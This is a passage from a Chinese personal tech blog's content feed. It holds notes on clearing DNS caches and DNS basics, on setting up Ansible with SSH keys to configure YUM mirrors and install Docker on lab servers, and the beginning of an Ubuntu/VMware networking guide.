class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dig</span> @<span class="hljs-number">192.168.136.8</span> <span class="hljs-literal">all</span>.example.local<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.Windows 系统&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nslookup</span> <span class="hljs-literal">all</span>.example.local <span class="hljs-number">192.168.136.8</span><br></code></pre></td></tr></table></figure><hr><h1 id="三、补充"><a href="#三、补充" class="headerlink" title="三、补充"></a>三、补充</h1><h3 id="1-如何查看和清除-DNS-查询缓存"><a href="#1-如何查看和清除-DNS-查询缓存" class="headerlink" title="1. 如何查看和清除 DNS 查询缓存"></a>1. 如何查看和清除 DNS 查询缓存</h3><h4 id="1-1-Chrome-浏览器缓存"><a href="#1-1-Chrome-浏览器缓存" class="headerlink" title="1.1. Chrome 浏览器缓存"></a>1.1. Chrome 浏览器缓存</h4><p>Chrome 浏览器将 DNS 缓存存储在内存中，通常情况下，关闭浏览器即可释放缓存。</p><p>在地址栏中输入 <code>chrome://net-internals/#dns</code> 即可查看当前的 DNS 查询缓存，点击 <strong>“Clear host cache”</strong> 按钮即可清除缓存。</p><hr><h4 id="1-2-操作系统-DNS-缓存"><a href="#1-2-操作系统-DNS-缓存" class="headerlink" title="1.2. 操作系统 DNS 缓存"></a>1.2. 操作系统 DNS 缓存</h4><p>&#x3D;&#x3D;1.Windows 系统&#x3D;&#x3D;<br>在 Windows 系统中，DNS 缓存存储在内存中，通常情况下，关闭电脑即可释放缓存。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看缓存</span><br>ipconfig /displaydns<br><br><br><span class="hljs-comment"># 清除缓存</span><br>ipconfig /flushdns<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.Linux 系统&#x3D;&#x3D;<br>Linux 系统通常不主动缓存 DNS 记录，而是依赖于如 <code>systemd-resolved</code> 等服务。如果系统使用了 <code>systemd-resolved</code> ，则会将服务，DNS 缓存存储在内存中，通常情况下，关闭电脑即可释放缓存。</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 查看缓存（Ubuntu）</span><br>resolvectl statistics<br><br><br><span class="hljs-comment"># 清除缓存（Ubuntu）</span><br>sudo <span class="hljs-params">system</span>ctl restart <span class="hljs-params">system</span>d-resolved<br></code></pre></td></tr></table></figure><hr><h4 id="1-3-BIND-DNS-缓存"><a href="#1-3-BIND-DNS-缓存" class="headerlink" title="1.3. BIND DNS 缓存"></a>1.3. BIND DNS 缓存</h4><p>BIND DNS 将缓存保存在主机内存中，通常情况下，关闭电脑即可释放缓存。如果配置了持久化缓存，BIND 会定期将内存中的缓存数据 <strong>保存到磁盘</strong>，具体存储路径由 <code>dump-file</code> 参数指定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 删除内存缓存</span><br>rndc flush<br><br><br><span class="hljs-comment"># 2. 删除持久化缓存</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> /var/named/data/cache_dump.db                  <span class="hljs-comment"># 配置的持久化缓存路径</span><br><br><br><span class="hljs-comment"># 3. 重启 BIND 服务</span><br><span class="hljs-built_in">sudo</span> systemctl restart named<br></code></pre></td></tr></table></figure><hr><h4 id="1-4-DNS-缓存"><a href="#1-4-DNS-缓存" class="headerlink" title="1.4. DNS 缓存"></a>1.4. DNS 缓存</h4><p>8.8.8.8 是 Google 提供的公共 DNS 服务器，其缓存存储于 Google 全球服务器集群中，因此无法通过本地命令直接清除 8.8.8.8 的缓存。</p><hr><h3 id="2-常用-DNS-服务器"><a href="#2-常用-DNS-服务器" class="headerlink" title="2. 常用 DNS 服务器"></a>2. 常用 DNS 服务器</h3><table><thead><tr><th>提供商</th><th>首选 DNS</th><th>备用 DNS</th><th>特色</th></tr></thead><tbody><tr><td><strong>Google DNS</strong></td><td><code>8.8.8.8</code></td><td><code>8.8.4.4</code></td><td>高速、全球 Anycast 部署，缓存命中率高</td></tr><tr><td><strong>Cloudflare DNS</strong></td><td><code>1.1.1.1</code></td><td><code>1.0.0.1</code></td><td>主打隐私保护，承诺不记录查询日志</td></tr><tr><td><strong>OpenDNS（Cisco）</strong></td><td><code>208.67.222.222</code></td><td><code>208.67.220.220</code></td><td>提供内容过滤、钓鱼网站防护</td></tr><tr><td><strong>Quad9 DNS</strong></td><td><code>9.9.9.9</code></td><td><code>149.112.112.112</code></td><td>强调安全性，可屏蔽恶意网站</td></tr><tr><td><strong>IBM Quad9（IPv6）</strong></td><td><code>2620:fe::fe</code></td><td><code>2620:fe::9</code></td><td>IPv6 支持，恶意网站防护</td></tr><tr><td><strong>ADguard DNS</strong></td><td><code>94.140.14.14</code></td><td><code>94.140.15.15</code></td><td>拦截广告和跟踪器，保护隐私</td></tr><tr><td>阿<strong>里 DNS</strong></td><td><code>223.5.5.5</code></td><td><code>223.6.6.6</code></td><td>适合中国用户，解析块</td></tr></tbody></table><hr><h3 id="3-主机名规范"><a href="#3-主机名规范" class="headerlink" title="3. 主机名规范"></a>3. 主机名规范</h3><table><thead><tr><th>主机名</th><th>说明</th><th>常见用途</th></tr></thead><tbody><tr><td><strong>@</strong></td><td>根域名（裸域名）</td><td>指向主要 IP 地址，通常为网站首页或 DNS 服务器 IP</td></tr><tr><td><strong>www</strong></td><td>常用前缀，代表网站</td><td>指向 Web 服务器，作为网站访问入口</td></tr><tr><td><strong>mail</strong></td><td>邮件相关主机名</td><td>指向邮件服务器，用于收发电子邮件</td></tr><tr><td><strong>ns1、ns2…</strong></td><td>DNS 服务器主机名</td><td>指向权威 DNS 服务器，负责解析该域名的 DNS 查询</td></tr><tr><td><strong>ftp</strong></td><td>文件传输相关主机名</td><td>指向 FTP 服务器，用于文件上传、下载及管理</td></tr><tr><td><strong>nfs</strong></td><td>网络文件系统</td><td>指向 NFS 服务器，提供远程文件共享</td></tr><tr><td><strong>api</strong></td><td>API 服务器</td><td>指向 API 端点，供第三方系统或前端应用调用</td></tr><tr><td><strong>cdn</strong></td><td>内容分发网络服务器</td><td>指向 CDN 节点，加速静态资源（图片、CSS、JS）加载</td></tr><tr><td><strong>cloud</strong></td><td>云服务相关主机名</td><td>可能用于云存储、云计算或云应用</td></tr><tr><td><strong>status</strong></td><td>服务器状态监控</td><td>用于提供系统状态信息，如 uptime、故障信息等</td></tr><tr><td><strong>dev</strong></td><td>开发环境</td><td>用于指向开发环境服务器，通常用于测试</td></tr><tr><td><strong>test</strong></td><td>测试环境</td><td>用于指向测试环境服务器</td></tr><tr><td><strong>staging</strong></td><td>预生产环境</td><td>介于测试与正式环境之间，模拟真实环境进行测试</td></tr><tr><td><strong>logs</strong></td><td>日志服务器</td><td>用于存储和分析应用程序日志</td></tr><tr><td><strong>backup</strong></td><td>备份服务器</td><td>存放备份数据，确保数据恢复可用</td></tr><tr><td><strong>db</strong></td><td>数据库服务器</td><td>指向数据库服务器，如 MySQL、PostgreSQL、MongoDB</td></tr><tr><td><strong>vpn</strong></td><td>VPN 服务器</td><td>用于提供远程安全访问网络</td></tr><tr><td><strong>proxy</strong></td><td>代理服务器</td><td>用于正向代理或反向代理，如 Nginx 代理</td></tr><tr><td><strong>gateway</strong></td><td>API 网关</td><td>用于流量管理、身份验证、负载均衡等</td></tr><tr><td><strong>storage</strong></td><td>存储服务器</td><td>用于存放和管理大规模数据，如对象存储、文件存储</td></tr><tr><td><strong>nas</strong></td><td>网络附加存储（Network Attached Storage）</td><td>指向 NAS 服务器，提供文件级存储</td></tr><tr><td><strong>iscsi</strong></td><td>iSCSI 存储服务器</td><td>供 iSCSI 客户端挂载远程存储设备</td></tr><tr><td><strong>smb</strong></td><td>SMB&#x2F;CIFS 共享服务器</td><td>供 Windows&#x2F;Linux 客户端访问网络共享文件夹</td></tr><tr><td><strong>rsync</strong></td><td>文件同步服务器</td><td>用于远程数据同步（rsync 协议）</td></tr></tbody></table><hr><h3 id="4-补充：常用DNS-记录类型"><a href="#4-补充：常用DNS-记录类型" class="headerlink" title="4. 补充：常用DNS 记录类型"></a>4. 补充：常用DNS 记录类型</h3><table><thead><tr><th><strong>记录类型</strong></th><th><strong>用途</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><strong>NS 记录</strong></td><td>指定域名的授权 DNS 服务器</td><td><code>example.com. IN NS ns1.example.com.</code></td></tr><tr><td><strong>A 记录</strong></td><td>将域名映射到 IPv4 地址</td><td><code>www.example.com. IN A 192.0.2.1</code></td></tr><tr><td><strong>AAAA 记录</strong></td><td>将域名映射到 IPv6 地址</td><td><code>www.example.com. IN AAAA</code> <br><code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></td></tr><tr><td><strong>SOA 记录</strong></td><td>定义区域的管理信息</td><td></td></tr><tr><td><strong>CNAME 记录</strong></td><td>将一个域名别名指向另一个域名</td><td><code>www.example.com. IN CNAME example.com.</code></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>网络相关</category>
      
      <category>DNS</category>
      
      <category>BIND DNS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Ansible</title>
    <link href="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9AAnsible/"/>
    <url>/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9AAnsible/</url>
    
    <content type="html"><![CDATA[<h3 id="1-Ansible-概述"><a href="#1-Ansible-概述" class="headerlink" title="1. Ansible 概述"></a>1. Ansible 概述</h3><p>Ansible 是一款强大的自动化运维工具，提供配置管理、应用部署和任务执行等多种功能。通过 Ansible，我们可以高效地管理和部署多个主机，实现例如一键配置 YUM 源、自动安装服务、快速部署 Docker 等操作。</p><hr><h3 id="2-环境准备"><a href="#2-环境准备" class="headerlink" title="2. 环境准备"></a>2. 环境准备</h3><p>完成 Ubuntu 操作系统的安装和基本配置见：<a href="https://blog.wangjia.xin/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/">Ubuntu 操作系统的安装和基本配置</a></p><hr><h3 id="3-配置-SSH-密钥对认证"><a href="#3-配置-SSH-密钥对认证" class="headerlink" title="3. 配置 SSH 密钥对认证"></a>3. 配置 SSH 密钥对认证</h3><h4 id="3-1-SSH-密钥对认证概述"><a href="#3-1-SSH-密钥对认证概述" class="headerlink" title="3.1. SSH 密钥对认证概述"></a>3.1. SSH 密钥对认证概述</h4><p>在使用 Ansible 管理远程主机之前，推荐在控制节点上配置 SSH 密钥对认证，这样 Ansible 在自动化操作时就无需每次输入密码，确保了免密登录。</p><hr><h4 id="3-2-生成-SSH-密钥对"><a href="#3-2-生成-SSH-密钥对" class="headerlink" title="3.2. 生成 SSH 密钥对"></a>3.2. 生成 SSH 密钥对</h4><p>在控制机上执行以下命令生成 SSH 密钥对（如果尚未存在密钥对）。默认情况下，私钥和公钥分别保存在 <code>~/.ssh/id_rsa</code> 和 <code>~/.ssh/id_rsa.pub</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> ssh-keygen -t rsa -b <span class="hljs-number">4096</span> -C <span class="hljs-string">&quot;your_email<span class="hljs-variable">@example</span>.com&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9AAnsible/image-20250315161627569.png"></p><ol><li><code>ssh-keygen -t rsa -b 4096 -C &quot;wangjia5289@163.com&quot;</code>：<ol><li>这个命令生成一个 RSA 类型的 SSH 密钥对，密钥长度为 4096 位，并为密钥加上注释 <code>&quot;wangjia5289@163.com&quot;</code>，通常用于标识密钥所属的用户</li></ol></li><li><code>Enter file in which to save the key (/root/.ssh/id_rsa)</code>：<ol><li>系统询问你希望将密钥保存到哪个文件路径。默认情况下，私钥将保存在 <code>/root/.ssh/id_rsa</code>，公钥保存在 <code>/root/.ssh/id_rsa.pub</code></li><li>如果你直接按回车，密钥将保存在默认路径。如果你输入其他路径，则会将密钥保存到你指定的位置</li></ol></li><li><code>Enter passphrase (empty for no passphrase)</code>：<ol><li>系统询问你是否要为私钥设置密码短语（passphrase）</li><li>如果设置了密码短语，每次使用密钥时都需要输入该密码，增加了安全性</li><li>自动化场景会不设密码，可以直接按回车（即留空），表示没有密码</li></ol></li><li><code>Enter same passphrase again</code>：<ol><li>系统要求你再输入一次密码短语，以确保你输入正确</li></ol></li></ol><hr><h4 id="受控主机指纹追加写进-SSH-的信任列表"><a href="#受控主机指纹追加写进-SSH-的信任列表" class="headerlink" title="受控主机指纹追加写进 SSH 的信任列表"></a>受控主机指纹追加写进 SSH 的信任列表</h4><p>提前告诉 SSH，这个主机是可信的，别再问我 yes&#x2F;no 了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span>-keyscan -H <span class="hljs-number">192.168.136.9</span> &gt;&gt; ~/.ssh/known_hosts &amp;&amp; ssh-keyscan -H <span class="hljs-number">192.168.136.10</span> &gt;&gt; ~/.ssh/known_hosts<br></code></pre></td></tr></table></figure><hr><h4 id="3-3-将公钥复制到受控主机"><a href="#3-3-将公钥复制到受控主机" class="headerlink" title="3.3. 将公钥复制到受控主机"></a>3.3. 将公钥复制到受控主机</h4><p>使用 <code>ssh-copy-id</code> 将公钥传送到受控主机（例如 IP 为 192.168.136.9）：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">ssh-<span class="hljs-keyword">copy</span><span class="language-bash">-<span class="hljs-built_in">id</span> -i ~/.ssh/id_rsa.pub root@192.168.136.9</span><br><br>ssh-<span class="hljs-keyword">copy</span><span class="language-bash">-<span class="hljs-built_in">id</span> -i ~/.ssh/id_rsa.pub root@192.168.136.10</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9AAnsible/image-20250516130541453.png"></p><hr><h4 id="3-4-测试-SSH-免密登录"><a href="#3-4-测试-SSH-免密登录" class="headerlink" title="3.4. 测试 SSH 免密登录"></a>3.4. 测试 SSH 免密登录</h4><p>测试控制机和受控主机之间是否能免密连接，若能直接登录则说明 SSH 密钥对认证配置成功。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 测试免密连接到受控主机</span><br>ssh root@<span class="hljs-number">192.168</span>.<span class="hljs-number">136.9</span><br><br><br><span class="hljs-comment"># 2. 退出</span><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9AAnsible/image-20250315163806382.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>ssh root@192.168.136.9</code> 是登录到该服务器，测试没问题要 <code>exit</code> 退出</li></ol></blockquote><hr><h3 id="4-安装-Ansible"><a href="#4-安装-Ansible" class="headerlink" title="4. 安装 Ansible"></a>4. 安装 Ansible</h3><p>在我们的控制机上安装 Ansible：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 1. 安装 Ansible</span><br>sudo apt install ansible -y<br><br><br><span class="hljs-comment"># 2. 验证安装</span><br>ansible <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-配置-Ansible-Inventory（主机清单）"><a href="#5-配置-Ansible-Inventory（主机清单）" class="headerlink" title="5. 配置 Ansible Inventory（主机清单）"></a>5. 配置 Ansible Inventory（主机清单）</h3><p>编辑控制机的 <code>/etc/ansible/hosts</code>（默认主机清单文件），把你的服务器信息加进去：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[servers]<br>server1 <span class="hljs-attribute">ansible_host</span>=192.168.136.9 <span class="hljs-attribute">ansible_user</span>=root<br>server2 <span class="hljs-attribute">ansible_host</span>=192.168.136.10 <span class="hljs-attribute">ansible_user</span>=root<br></code></pre></td></tr></table></figure><ol><li><code>server1</code>：<ol><li>为主机指定别名，在执行 Ansible 任务时，可以使用 <code>server1</code> 代替 <code>192.168.1.101</code></li><li>这样做的好处是提升可读性，如果 IP 发生变化，只需修改对应的 IP 地址即可</li></ol></li><li><code>ansible_host=192.168.1.101</code>：<ol><li>填写受控主机的 IP 地址</li></ol></li><li><code>ansible_user=root</code>：<ol><li>指定 SSH 的连接用户，这里是 <code>root</code> 用户</li><li>如果受控主机不允许 <code>root</code> 直接 SSH 登录，你可能需要改成普通用户，比如 <code>ansible_user=admin</code></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>[servers]</code> 是组名，你可以用组来管理不同的服务器集群，例如：</li></ol></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[webservers]<br>server1 <span class="hljs-attribute">ansible_host</span>=192.168.1.101 <span class="hljs-attribute">ansible_user</span>=root<br>server2 <span class="hljs-attribute">ansible_host</span>=192.168.1.102 <span class="hljs-attribute">ansible_user</span>=root<br><br>[dbservers]<br>server3 <span class="hljs-attribute">ansible_host</span>=192.168.1.201 <span class="hljs-attribute">ansible_user</span>=root<br></code></pre></td></tr></table></figure><hr><h3 id="6-测试-SSH-连接"><a href="#6-测试-SSH-连接" class="headerlink" title="6. 测试 SSH 连接"></a>6. 测试 SSH 连接</h3><p>使用 Ansible 内置的 <code>ping</code> 模块测试所有主机的连通性：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ansible <span class="hljs-attribute">all</span> -<span class="hljs-selector-tag">i</span> /etc/ansible/hosts -m ping -u root<br></code></pre></td></tr></table></figure><p><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9AAnsible/image-20250315174245349.png"></p><hr><h3 id="7-远程执行命令"><a href="#7-远程执行命令" class="headerlink" title="7. 远程执行命令"></a>7. 远程执行命令</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ansible serverName -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;各种 shell 命令&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>这个命令仅在 <code>serverName</code> 组内的受控主机上执行，操作机自身不会执行。若希望操作机也参与执行，可使用 <code>&quot;localhost:serverName&quot;</code> 指定目标主机。</li><li>如果有多个命令要执行，可以通过 &amp;&amp; 来连接：</li></ol></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ansible servers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;shell命令1 &amp;&amp; shell命令2 &amp;&amp; shell命令3&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="8-使用-Ansible-为多服务器配置-YUM-源"><a href="#8-使用-Ansible-为多服务器配置-YUM-源" class="headerlink" title="8. 使用 Ansible 为多服务器配置 YUM 源"></a>8. 使用 Ansible 为多服务器配置 YUM 源</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 为 Centos7 受控主机配置阿里 YUM 源</span><br>ansible servers <span class="hljs-operator">-</span>m shell <span class="hljs-operator">-</span>a <span class="hljs-string">&quot;sudo mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak&quot;</span><br><br><br><span class="hljs-comment"># 为 Centos7 受控主机创建新的 YUM 源并配置为阿里云的 YUM 镜像源</span><br>ansible servers <span class="hljs-operator">-</span>m shell <span class="hljs-operator">-</span>a <span class="hljs-string">&quot;echo -e &#x27;[base]<span class="hljs-char escape_">\n</span>name=CentOS-7 - Base - mirrors.aliyun.com<span class="hljs-char escape_">\n</span>baseurl=http://mirrors.aliyun.com/centos/7/os/x86_64/<span class="hljs-char escape_">\n</span>gpgcheck=1<span class="hljs-char escape_">\n</span>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>[updates]<span class="hljs-char escape_">\n</span>name=CentOS-7 - Updates - mirrors.aliyun.com<span class="hljs-char escape_">\n</span>baseurl=http://mirrors.aliyun.com/centos/7/updates/x86_64/<span class="hljs-char escape_">\n</span>gpgcheck=1<span class="hljs-char escape_">\n</span>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>[extras]<span class="hljs-char escape_">\n</span>name=CentOS-7 - Extras - mirrors.aliyun.com<span class="hljs-char escape_">\n</span>baseurl=http://mirrors.aliyun.com/centos/7/extras/x86_64/<span class="hljs-char escape_">\n</span>gpgcheck=1<span class="hljs-char escape_">\n</span>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7&#x27; | sudo tee /etc/yum.repos.d/CentOS-Base.repo&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="9-使用-Ansible-为多服务器安装-Docker"><a href="#9-使用-Ansible-为多服务器安装-Docker" class="headerlink" title="9. 使用 Ansible 为多服务器安装 Docker"></a>9. 使用 Ansible 为多服务器安装 Docker</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 为受控主机安装国内 Docker YUM 源</span><br>ansible servers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;sudo yum install -y yum-utils &amp;&amp; sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo&quot;</span><br><br><br><span class="hljs-comment"># 受控主机安装最新版本的 Docker</span><br>ansible servers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;yum install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin&quot;</span><br><br><br><span class="hljs-comment"># 检查 Docker 的版本</span><br>ansible servers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;docker --version&quot;</span><br><br><br><span class="hljs-comment"># 启动 Docker 并设置开机自启</span><br>ansible servers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;systemctl enable --now docker&quot;</span><br><br><span class="hljs-comment"># 配置 Docker 加速器</span><br>ansible servers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;sudo mkdir -p /etc/docker &amp;&amp; echo &#x27;&#123;\&quot;registry-mirrors\&quot;: [\&quot;https://dh-mirror.gitverse.ru\&quot;]&#125;&#x27; | sudo tee /etc/docker/daemon.json &amp;&amp; sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker &amp;&amp; docker info&quot;</span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>自动化</category>
      
      <category>Ansible</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Linux</title>
    <link href="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/"/>
    <url>/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/</url>
    
    <content type="html"><![CDATA[<h2 id="1-导图：Map：Linux"><a href="#1-导图：Map：Linux" class="headerlink" title="1. 导图：Map：Linux"></a>1. 导图：<a href="../../maps/Map%EF%BC%9ALinux.xmind">Map：Linux</a></h2><hr><h2 id="2-Ubuntu-操作系统的安装和基本配置"><a href="#2-Ubuntu-操作系统的安装和基本配置" class="headerlink" title="2. Ubuntu 操作系统的安装和基本配置"></a>2. Ubuntu 操作系统的安装和基本配置</h2><h3 id="2-1-安装-Ubuntu-操作系统"><a href="#2-1-安装-Ubuntu-操作系统" class="headerlink" title="2.1. 安装 Ubuntu 操作系统"></a>2.1. 安装 Ubuntu 操作系统</h3><p>这里选择从 <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/">清华大学开源软件镜像站</a> 下载并安装 <code>ubuntu-22.04-desktop-amd64.iso</code></p><hr><h3 id="2-2-网络设置"><a href="#2-2-网络设置" class="headerlink" title="2.2. 网络设置"></a>2.2. 网络设置</h3><h4 id="2-2-1-Windows-启动-VMware-NAT-Service-服务（☆）"><a href="#2-2-1-Windows-启动-VMware-NAT-Service-服务（☆）" class="headerlink" title="2.2.1. Windows 启动 VMware NAT Service 服务（☆）"></a>2.2.1. Windows 启动 VMware NAT Service 服务（☆）</h4><p><img src="/image-20250315102024363.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>以后发现问题不对，就来找这个，很可能是因为这个东西未启动</li></ol></blockquote><hr><h4 id="2-2-2-配置-VMware-软件的虚拟网络编译器"><a href="#2-2-2-配置-VMware-软件的虚拟网络编译器" class="headerlink" title="2.2.2. 配置 VMware 软件的虚拟网络编译器"></a>2.2.2. 配置 VMware 软件的虚拟网络编译器</h4><p>1.&#x3D;&#x3D;点击 编辑 -&gt;-&gt;-&gt; 虚拟网络编译器&#x3D;&#x3D;<br><img src="/image-20250315102345834.png"></p><p>&#x3D;&#x3D;2.记住此处子网IP&#x3D;&#x3D;<br><img src="/image-20250315102523602.png"></p><p>&#x3D;&#x3D;3.记住 NAT 的网关 IP&#x3D;&#x3D;<br><img src="/image-20250315102727828.png"></p><p><img src="/image-20250315102806921.png"></p><p>&#x3D;&#x3D;4.配置 NAT 模式&#x3D;&#x3D;<br><img src="/image-20250315102923234.png"></p><p><img src="/image-20250315103044276.png"></p><hr><h4 id="2-2-3-配置虚拟机的网络适配器"><a href="#2-2-3-配置虚拟机的网络适配器" class="headerlink" title="2.2.3. 配置虚拟机的网络适配器"></a>2.2.3. 配置虚拟机的网络适配器</h4><p><img src="/image-20250315103315818.png"><br><img src="/image-20250315103335885.png"></p><hr><h4 id="2-2-4-Windows-配置-VMware-Network-Adapter-VMnet8"><a href="#2-2-4-Windows-配置-VMware-Network-Adapter-VMnet8" class="headerlink" title="2.2.4. Windows 配置 VMware Network Adapter VMnet8"></a>2.2.4. Windows 配置 VMware Network Adapter VMnet8</h4><p><img src="/image-20250315103512620.png"></p><p><img src="/image-20250315104102514.png"></p><hr><h4 id="2-2-5-配置虚拟机的-Network"><a href="#2-2-5-配置虚拟机的-Network" class="headerlink" title="2.2.5. 配置虚拟机的 Network"></a>2.2.5. 配置虚拟机的 Network</h4><p><img src="/image-20250315104515867.png"></p><p><img src="/image-20250315121549400.png"></p><hr><h3 id="2-3-设置代理"><a href="#2-3-设置代理" class="headerlink" title="2.3. 设置代理"></a>2.3. 设置代理</h3><p>&#x3D;&#x3D;1.查询代理服务器的 IP&#x3D;&#x3D;<br><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/image-20250404204208673.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>由于连接不同的 Wi-Fi 或热点时 IP 地址会发生变化，因此我在下文建议使用临时代理。</li></ol></blockquote><p>&#x3D;&#x3D;2.设置 图形界面应用 代理&#x3D;&#x3D;<br><img src="/2025/03/15/%E7%AC%94%E8%AE%B0%EF%BC%9ALinux/image-20250404165010104.png"></p><p>&#x3D;&#x3D;3.设置 命令行工具 代理&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 